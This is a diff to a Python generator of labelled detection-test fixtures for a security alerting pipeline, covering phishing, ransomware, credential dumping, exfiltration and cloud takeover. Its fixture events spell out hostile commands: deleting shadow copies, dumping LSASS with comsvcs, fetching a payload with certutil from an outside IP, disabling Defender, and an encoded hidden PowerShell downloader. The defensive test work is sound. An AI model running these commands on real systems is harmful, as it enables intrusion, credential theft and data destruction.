@@ -32,6 +32,46 @@ def ident(ts, **kw):
     return {"ts": ts.isoformat(), "kind": "identity", **kw}
 
 
+def proc(ts, **kw):
+    return {"ts": ts.isoformat(), "kind": "process", "source": "sysmon", **kw}
+
+
+def net(ts, **kw):
+    return {"ts": ts.isoformat(), "kind": "network", "source": "zeek", **kw}
+
+
+def file_(ts, **kw):
+    return {"ts": ts.isoformat(), "kind": "file", "source": "sysmon", **kw}
+
+
+def cloud(ts, call, user="deploy-bot", ip="203.0.113.9", region="us-east-1", params=None, **raw):
+    rec = {"eventTime": ts.isoformat(), "eventName": call, "awsRegion": region, "sourceIPAddress": ip,
+           "userIdentity": {"type": "IAMUser", "userName": user}, "requestParameters": params or {},
+           "recipientAccountId": "111122223333", **raw}
+    return {"ts": ts.isoformat(), "kind": "cloud", "source": "cloudtrail", "provider": "aws", "api_call": call,
+            "user": user, "source_ip": ip, "region": region, "account_id": "111122223333",
+            "resource": str((params or {}).get("bucketName") or (params or {}).get("userName") or (params or {}).get("name") or ""),
+            "outcome": "success", "raw": rec}
+
+
+def endpoint_noise(start, n, seed, host="ws-20", user="rkhan"):
+    rng = random.Random(seed)
+    apps = [("explorer.exe", "chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'),
+            ("explorer.exe", "outlook.exe", '"C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE"'),
+            ("services.exe", "svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
+            ("explorer.exe", "powershell.exe", "powershell.exe -NoProfile -Command Get-ChildItem C:\\Users"),
+            ("explorer.exe", "excel.exe", '"C:\\Program Files\\Microsoft Office\\EXCEL.EXE" /n budget.xlsx')]
+    out = []
+    for i in range(n):
+        par, name, cmd = rng.choice(apps)
+        ts = start + timedelta(seconds=rng.randint(0, 3600))
+        out.append(proc(ts, action="start", host=host, user=user, parent_name=par, process_name=name, command_line=cmd,
+                        pid=1000 + i))
+        out.append(net(ts, host=host, source_ip="10.0.4.20", dest_ip=rng.choice(["142.250.80.46", "52.96.0.10", "10.0.0.53"]),
+                       dest_port=443, protocol="tcp", bytes_out=rng.randint(500, 90000), bytes_in=rng.randint(500, 900000)))
+    return out
+
+
 def noise(start, n, seed):
     """Benign internal traffic. Never enough failures from one IP to fire anything."""
     rng = random.Random(seed)
@@ -345,6 +385,247 @@ def case_single_reset():
     })
 
 
+# ---------------------------------------------------------------- Phase 4: endpoint, network, cloud
+def case_phish_chain():
+    """The roadmap's cross-domain chain: phish click -> macro spawns PowerShell -> beaconing
+    -> lateral SMB -> new admin account."""
+    base, host, ip, c2 = T0 + timedelta(minutes=5), "ws-17", "10.0.4.17", "185.220.101.66"
+    evs = endpoint_noise(T0, 40, 31) + noise(T0, 60, 31)
+    evs.append(proc(base, action="start", host=host, user="jlee", parent_name="winword.exe", process_name="powershell.exe",
+                    command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+                    pid=4242))
+    for i in range(12):
+        evs.append(net(base + timedelta(seconds=60 + i * 300 + (i % 3) * 7), host=host, source_ip=ip, dest_ip=c2,
+                       dest_port=443, protocol="tcp", bytes_out=1400, bytes_in=320, process_name="powershell.exe"))
+    for i in range(7):
+        evs.append(net(base + timedelta(minutes=40, seconds=i * 9), host=host, source_ip=ip, dest_ip=f"10.0.6.{20 + i}",
+                       dest_port=445, protocol="tcp", bytes_out=5000, bytes_in=3000))
+    evs.append(ident(base + timedelta(minutes=52), source="windows", change_type="account_created", user="jlee",
+                     target_user="svc-backup2", host="ad-dc-01"))
+    evs.append(ident(base + timedelta(minutes=53), source="windows", change_type="group_add", user="jlee",
+                     target_user="svc-backup2", group="Domain Admins", host="ad-dc-01"))
+    write("18-phish-to-domain-admin", evs, {
+        "name": "phish -> macro PowerShell -> beacon -> SMB fan-out -> new domain admin",
+        "description": "Cross-domain chain on ws-17 and jlee, the one the Phase 4 exit criteria ask for.",
+        "alerts": [
+            {"rule": "suspicious_parent_child", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "encoded_powershell", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "beaconing", "match": {"source_ip": c2}, "label": "true_positive"},
+            {"rule": "lateral_movement_fanout", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "account_create_then_privilege", "match": {"user": "svc-backup2"}, "label": "true_positive"},
+            {"rule": "privileged_group_add", "match": {"user": "svc-backup2"}, "label": "true_positive"},
+        ],
+        "incidents": [{"rules": ["suspicious_parent_child", "beaconing", "lateral_movement_fanout", "privileged_group_add"],
+                       "label": "true_positive", "risk_min": 90,
+                       "expect_actions": {"isolate_host": "execute", "block_ip": "execute", "lock_user": "approve", **TICKET}}],
+    })
+
+
+def case_ransomware():
+    base, host = T0 + timedelta(minutes=20), "fs-02"
+    evs = endpoint_noise(T0, 40, 32, host="fs-02", user="svc-files")
+    evs.append(proc(base, action="start", host=host, user="svc-files", parent_name="cmd.exe", process_name="vssadmin.exe",
+                    command_line="vssadmin.exe delete shadows /all /quiet", pid=700))
+    evs.append(proc(base + timedelta(seconds=4), action="start", host=host, user="svc-files", parent_name="cmd.exe",
+                    process_name="bcdedit.exe", command_line="bcdedit /set {default} recoveryenabled No", pid=701))
+    for i in range(90):
+        evs.append(file_(base + timedelta(seconds=30 + i * 0.4), host=host, user="svc-files", process_name="svch0st.exe",
+                         action="rename", path=f"D:\\Shares\\Finance\\q{i:03d}.xlsx.lockbit",
+                         old_path=f"D:\\Shares\\Finance\\q{i:03d}.xlsx"))
+    evs.append(file_(base + timedelta(seconds=70), host=host, user="svc-files", process_name="svch0st.exe", action="create",
+                     path="D:\\Shares\\Finance\\README_RESTORE.txt"))
+    write("19-ransomware", evs, {
+        "name": "shadow copies deleted, then mass encryption on the file server",
+        "description": "vssadmin and bcdedit, then 90 files renamed to .lockbit in 36 seconds with a ransom note.",
+        "alerts": [
+            {"rule": "ransomware_precursor", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "ransomware_precursor", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "mass_file_encryption", "match": {"host": host}, "label": "true_positive"},
+        ],
+        "incidents": [{"rules": ["ransomware_precursor", "mass_file_encryption"], "label": "true_positive", "risk_min": 95,
+                       "expect_actions": {"isolate_host": "execute", **TICKET}}],
+    })
+
+
+def case_cred_dump_and_cleanup():
+    base, host = T0 + timedelta(minutes=30), "ws-31"
+    evs = endpoint_noise(T0, 30, 33, host=host, user="pwong")
+    evs.append(proc(base, action="start", host=host, user="pwong", parent_name="cmd.exe", process_name="rundll32.exe",
+                    command_line="rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 612 C:\\Users\\Public\\l.dmp full",
+                    pid=900))
+    evs.append(proc(base + timedelta(minutes=3), action="log_cleared", host=host, user="pwong", process_name="eventlog",
+                    target="Security"))
+    write("20-credential-dump-and-log-clear", evs, {
+        "name": "comsvcs MiniDump of LSASS, then the Security log cleared",
+        "description": "Credential theft followed by anti-forensics on the same workstation.",
+        "alerts": [
+            {"rule": "credential_dumping", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "lolbin_abuse", "match": {"host": host}, "label": "true_positive",
+             "note": "rundll32 running comsvcs from a user-writable path matches the rundll32 LOLBin pattern too"},
+            {"rule": "log_clearing", "match": {"host": host}, "label": "true_positive"},
+        ],
+        "incidents": [{"rules": ["credential_dumping", "log_clearing"], "label": "true_positive", "risk_min": 90,
+                       "expect_actions": {"isolate_host": "execute", **TICKET}}],
+    })
+
+
+def case_lolbin_persistence_tamper():
+    base, host = T0 + timedelta(minutes=12), "ws-44"
+    evs = endpoint_noise(T0, 30, 34, host=host, user="tnguyen")
+    evs.append(proc(base, action="start", host=host, user="tnguyen", parent_name="cmd.exe", process_name="certutil.exe",
+                    command_line="certutil.exe -urlcache -split -f http://185.220.101.70/u.bin C:\\ProgramData\\u.exe", pid=510))
+    evs.append(proc(base + timedelta(minutes=1), action="task_created", host=host, user="tnguyen", process_name="schtasks",
+                    target="\\OneDriveUpdate", command_line="C:\\ProgramData\\u.exe"))
+    evs.append(proc(base + timedelta(minutes=2), action="start", host=host, user="tnguyen", parent_name="cmd.exe",
+                    process_name="powershell.exe", command_line="powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+                    pid=511))
+    write("21-lolbin-persistence-tamper", evs, {
+        "name": "certutil download, scheduled task, Defender switched off",
+        "description": "Payload fetched with a signed binary, persisted as a task, then protection disabled.",
+        "alerts": [
+            {"rule": "lolbin_abuse", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "persistence_mechanism", "match": {"host": host}, "label": "true_positive"},
+            {"rule": "security_tool_tamper", "match": {"host": host}, "label": "true_positive"},
+        ],
+        "incidents": [{"rules": ["lolbin_abuse", "persistence_mechanism", "security_tool_tamper"], "label": "true_positive",
+                       "risk_min": 85, "expect_actions": {"isolate_host": "execute", **TICKET}}],
+    })
+
+
+def case_dns_tunnel():
+    rng = random.Random(35)
+    base, host = T0 + timedelta(minutes=3), "ws-52"
+    evs = endpoint_noise(T0, 30, 35, host=host, user="cwu")
+    for i in range(45):
+        label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(40))
+        evs.append(net(base + timedelta(seconds=i * 20), host=host, source_ip="10.0.4.52", dest_ip="10.0.0.53", dest_port=53,
+                       protocol="dns", dns_type="TXT" if i % 4 == 0 else "A", domain=f"{label}.x7-cdn-sync.net"))
+    write("22-dns-tunneling", evs, {
+        "name": "data smuggled in DNS labels",
+        "description": "45 lookups of 40-character base32 labels under one freshly registered domain.",
+        "alerts": [{"rule": "dns_tunneling", "match": {"host": host}, "label": "true_positive", "risk_min": 70,
+                    "expect_actions": {"isolate_host": "execute", **TICKET}}],
+    })
+
+
+def case_internal_scan():
+    base = T0 + timedelta(minutes=14)
+    evs = endpoint_noise(T0, 20, 36)
+    evs += [net(base + timedelta(seconds=i), host="ws-60", source_ip="10.0.4.60", dest_ip="10.0.9.10", dest_port=p,
+                protocol="tcp", action="blocked") for i, p in enumerate([21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443,
+                                                                         445, 993, 1433, 1521, 3306, 3389, 5432, 5900, 5985, 8080])]
+    write("23-internal-port-scan", evs, {
+        "name": "workstation scanning a server",
+        "description": "22 ports on one server in 22 seconds, nearly all rejected.",
+        "alerts": [{"rule": "port_scan", "match": {"source_ip": "10.0.4.60"}, "label": "true_positive",
+                    "expect_actions": TICKET}],
+    })
+
+
+def case_exfil():
+    base, host = T0 + timedelta(minutes=10), "fs-01"
+    history = [net(T0 - timedelta(days=d), host=host, source_ip="10.0.3.10", dest_ip="52.216.10.5", dest_port=443,
+                   protocol="tcp", bytes_out=900_000_000, domain="backup.s3.amazonaws.com") for d in (1, 2, 3)]
+    evs = endpoint_noise(T0, 20, 37, host=host, user="svc-files")
+    evs += [net(base + timedelta(minutes=i), host=host, source_ip="10.0.3.10", dest_ip="198.51.100.200", dest_port=443,
+                protocol="tcp", bytes_out=120_000_000, domain="gfs302n.mega.co.nz", process_name="rclone.exe") for i in range(7)]
+    evs += [net(base + timedelta(minutes=30), host=host, source_ip="10.0.3.10", dest_ip="52.216.10.5", dest_port=443,
+                protocol="tcp", bytes_out=900_000_000, domain="backup.s3.amazonaws.com")]
+    write("24-exfil-rclone", evs, {
+        "name": "840 MB to MEGA with rclone; the nightly S3 backup stays quiet",
+        "description": "New destination and large volume fires; the known backup destination does not.",
+        "alerts": [{"rule": "data_exfiltration", "match": {"source_ip": "198.51.100.200"}, "label": "true_positive",
+                    "risk_min": 80, "expect_actions": {"block_ip": "execute", "isolate_host": "execute", **TICKET}}],
+    }, history=history)
+
+
+def case_ioc():
+    evs = endpoint_noise(T0, 20, 38)
+    evs.append(net(T0 + timedelta(minutes=33), host="ws-20", source_ip="10.0.4.20", dest_ip="50.16.16.211", dest_port=443,
+                   protocol="tcp", bytes_out=2400, bytes_in=800))
+    spec = {"name": "connection to a Feodo-listed QakBot C2",
+            "description": "One HTTPS session to an IP on the abuse.ch Feodo list.",
+            "iocs": [{"type": "ip", "value": "50.16.16.211", "source": "feodo", "confidence": 90,
+                      "tags": {"malware": "QakBot", "status": "online"}},
+                     {"type": "ip", "value": "142.250.80.46", "source": "tor_exit", "confidence": 30, "tags": {}}],
+            "alerts": [{"rule": "intel_ioc_match", "match": {"source_ip": "50.16.16.211"}, "label": "true_positive",
+                        "expect_actions": {"block_ip": "execute", **TICKET},
+                        "note": "the Tor-listed IP in the same traffic is below the confidence floor and must not fire"}]}
+    write("25-intel-c2-hit", evs, spec)
+
+
+def case_cloud_takeover():
+    base = T0 + timedelta(minutes=5)
+    evs = [cloud(base, "ConsoleLogin", responseElements={"ConsoleLogin": "Success"}, additionalEventData={"MFAUsed": "No"}),
+           cloud(base + timedelta(minutes=2), "CreateAccessKey", params={"userName": "ci-admin"}),
+           cloud(base + timedelta(minutes=3), "AttachUserPolicy",
+                 params={"userName": "deploy-bot", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}),
+           cloud(base + timedelta(minutes=5), "StopLogging", params={"name": "org-trail"}),
+           cloud(base + timedelta(minutes=9), "RunInstances", region="ap-south-1", params={"instanceType": "p4d.24xlarge"})]
+    evs += [cloud(T0 + timedelta(minutes=m), "DescribeInstances", user="ops-ro", ip="10.0.1.5") for m in range(0, 60, 6)]
+    write("26-cloud-takeover", evs, {
+        "name": "console login without MFA -> access key for an admin -> AdministratorAccess -> trail stopped -> GPUs in Mumbai",
+        "description": "A leaked IAM password used end to end in nine minutes.",
+        "alerts": [
+            {"rule": "console_login_no_mfa", "match": {"user": "deploy-bot"}, "label": "true_positive"},
+            {"rule": "new_access_key", "match": {"user": "deploy-bot"}, "label": "true_positive"},
+            {"rule": "iam_admin_grant", "match": {"user": "deploy-bot"}, "label": "true_positive"},
+            {"rule": "cloud_logging_disabled", "match": {"user": "deploy-bot"}, "label": "true_positive"},
+            {"rule": "unusual_region", "match": {"user": "deploy-bot"}, "label": "true_positive"},
+        ],
+        "incidents": [{"rules": ["console_login_no_mfa", "iam_admin_grant", "cloud_logging_disabled", "unusual_region"],
+                       "label": "true_positive", "risk_min": 90,
+                       "expect_actions": {"disable_access_key": "execute", **TICKET}}],
+    })
+
+
+def case_public_bucket_and_forwarding():
+    base = T0 + timedelta(minutes=5)
+    pol = {"Statement": [{"Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::corp-exports/*"}]}
+    evs = [cloud(base, "PutBucketPolicy", user="analyst-kb", ip="10.0.1.9", params={"bucketName": "corp-exports", "bucketPolicy": pol})]
+    evs.append({"ts": (base + timedelta(minutes=20)).isoformat(), "kind": "cloud", "source": "o365", "provider": "m365",
+                "api_call": "New-InboxRule", "user": "cfo.smith@corp.example", "source_ip": "45.83.140.9", "outcome": "success",
+                "raw": {"Operation": "New-InboxRule", "Parameters": [
+                    {"Name": "Name", "Value": ".."}, {"Name": "SubjectContainsWords", "Value": "invoice;payment;wire"},
+                    {"Name": "ForwardTo", "Value": "ap.payments@proton.me"}, {"Name": "DeleteMessage", "Value": "True"}]}})
+    write("27-public-bucket-and-bec-rule", evs, {
+        "name": "export bucket opened to the internet; CFO mailbox forwards invoices outside",
+        "description": "Two unrelated cloud findings in the same hour; they must stay separate.",
+        "alerts": [
+            {"rule": "public_bucket", "match": {"user": "analyst-kb"}, "label": "true_positive", "expect_actions": TICKET},
+            {"rule": "mailbox_forwarding_rule", "match": {"user": "cfo.smith@corp.example"}, "label": "true_positive",
+             "expect_actions": {"lock_user": "approve", **TICKET}},
+        ],
+    })
+
+
+def case_benign_endpoint_and_cloud():
+    base = T0 + timedelta(minutes=10)
+    rng = random.Random(39)
+    evs = endpoint_noise(T0, 80, 39)
+    evs.append(proc(base, action="service_installed", host="ws-20", user="LocalSystem", process_name="services.exe",
+                    target='"C:\\Program Files\\Zoom\\bin\\ZoomService.exe"',
+                    command_line='ZoomService: "C:\\Program Files\\Zoom\\bin\\ZoomService.exe"'))
+    evs.append(proc(base, action="start", host="ws-20", user="rkhan", parent_name="excel.exe", process_name="splwow64.exe",
+                    command_line="splwow64.exe 12288"))
+    t = base
+    for i in range(10):     # update checker: periodic-ish but with human-scale jitter
+        t += timedelta(seconds=rng.choice([600, 900, 1500, 3600]))
+        evs.append(net(t, host="ws-20", source_ip="10.0.4.20", dest_ip="13.107.4.50", dest_port=443, protocol="tcp",
+                       bytes_out=900, bytes_in=40000))
+    evs += [cloud(base + timedelta(minutes=m), c, user="ops", ip="10.0.1.5", params=p) for m, c, p in [
+        (1, "RunInstances", {"instanceType": "t3.small"}), (2, "CreateAccessKey", {}),
+        (3, "PutBucketPolicy", {"bucketName": "logs", "bucketPolicy": {"Statement": [
+            {"Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::111122223333:role/ingest"}, "Action": "s3:PutObject"}]}})]]
+    evs.append(cloud(base + timedelta(minutes=4), "ConsoleLogin", user="ops", ip="10.0.1.5",
+                     responseElements={"ConsoleLogin": "Success"}, additionalEventData={"MFAUsed": "Yes"}))
+    write("28-benign-admin-day", evs, {
+        "name": "ordinary admin activity that resembles six Phase 4 rules",
+        "description": "Vendor service install, Excel printing, a jittery update checker, and routine AWS work with MFA.",
+        "alerts": [],
+    })
+
+
 if __name__ == "__main__":
     if EVAL.exists():
         shutil.rmtree(EVAL)
@@ -352,6 +633,8 @@ if __name__ == "__main__":
     for fn in [case_brute_force, case_password_spray, case_impossible_travel, case_mfa_fatigue, case_service_account_fp,
                case_quiet_hour, case_credential_stuffing, case_new_geo_benign, case_attack_chain, case_dormant,
                case_service_account_rdp, case_create_then_privilege, case_session_replay, case_reset_abuse,
-               case_lockout_storm, case_single_reset]:
+               case_lockout_storm, case_single_reset, case_phish_chain, case_ransomware, case_cred_dump_and_cleanup,
+               case_lolbin_persistence_tamper, case_dns_tunnel, case_internal_scan, case_exfil, case_ioc,
+               case_cloud_takeover, case_public_bucket_and_forwarding, case_benign_endpoint_and_cloud]:
         fn()
     print(f"\nfixtures written to {EVAL}")
